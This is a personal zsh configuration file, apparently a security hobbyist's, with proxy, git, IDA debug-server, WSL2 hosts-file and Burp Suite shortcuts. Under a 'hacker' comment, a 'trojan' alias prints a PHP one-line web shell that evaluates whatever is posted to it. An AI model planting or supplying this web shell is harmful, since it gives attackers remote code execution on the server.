export ZSH="$HOME/.oh-my-zsh"
UNAME=$(uname -a)
# network
alias proxyoff="export https_proxy='' http_proxy='' all_proxy=''"
alias proxyon="export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890"
alias pchain="proxychains4"
alias google="curl google.com"
alias baidu="curl baidu.com"
alias pmod="sudo chmod a+x *" # power mod
alias idax86="cd ~/pwn/server && ./linux_server"
alias idax64="cd ~/pwn/server && ./linux_server64"
alias pwn="code ~/pwn"
alias update="cd ~/maintain && git pull && sudo ln -s ~/maintain/tools/* /usr/local/bin"
alias ggg="gaa && gcmsg ".." && gp"
alias gitback="git reset . && git checkout . && git clean -df" # git back (to origin)
function ipof(){
  ping $1 -c 1 | sed -n "1p" | cut -d '(' -f2|cut -d ')' -f1;
}
function killport(){
  kill -9 $(lsof -i:$1 | sed -n "2p" | cut -d " " -f 2)
}
# for ubuntu Desktop
# for m1 MACbook
if [[ $UNAME =~ "Darwin" ]]
then
    echo "U are using Mac! I know."
    alias pd="prlctl start"
    alias python3="/opt/homebrew/bin/python3"
    alias pip3="/opt/homebrew/bin/pip3"
    alias burp="cd ~/Desktop/BurpSuite2020.12 && nohup ./BURP.sh > /dev/null &"
fi
# for WSL2
if [[ $UNAME =~ "WSL2" ]]
then
    echo "U are using WSL2! I know."
    alias pwncp="cp /mnt/c/Users/27564/Desktop/pwnfiles/* ~/pwn/target && chmod a+x ~/pwn/target/*"
    function wsl_hosts(){
      hosts="/mnt/c/Windows/System32/drivers/etc/hosts"
      ip=$(ip add | grep inet | grep eth0 | awk -F" " '{print $2}' | cut -d"/" -f 1)
      echo "new record: $ip wsl.local"
      if [[ $(cat $hosts | grep "wsl.local") ]];
      then
        echo "find wsl.local in host, changing ip record...";
        # sudo sed -i "$(cat -n $hosts | grep "share" | awk -F" " '{print $1}')i $ip wsl.local" $hosts;
        # 上面的是用来插入内容，仅供参考学习
        sed -i "s/^.*wsl.local/$ip wsl.local/g" $hosts
      else echo "wsl.local not in host file, adding...";
        sudo echo "$ip wsl.local" >> $hosts;
      fi
    }
    function load(){
      if [[ $(service $1 status | grep not) ]];then sudo service $1 start;echo "$1 just started";else echo "$1 is already running";fi
    }
    wsl_hosts
    load ssh
fi
# hacker
alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"

ZSH_THEME="ys"

plugins=(git
gitignore
extract
sudo
zsh-autosuggestions
zsh-syntax-highlighting
autojump
)
	
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=#ff00ff,bg=cyan,bold,underline"

[[ -s $HOME/.autojump/etc/profile.d/autojump.sh ]] && source $HOME/.autojump/etc/profile.d/autojump.sh
autoload -U compinit && compinit -u
source $ZSH/oh-my-zsh.sh
# . "$HOME/.acme.sh/acme.sh.env"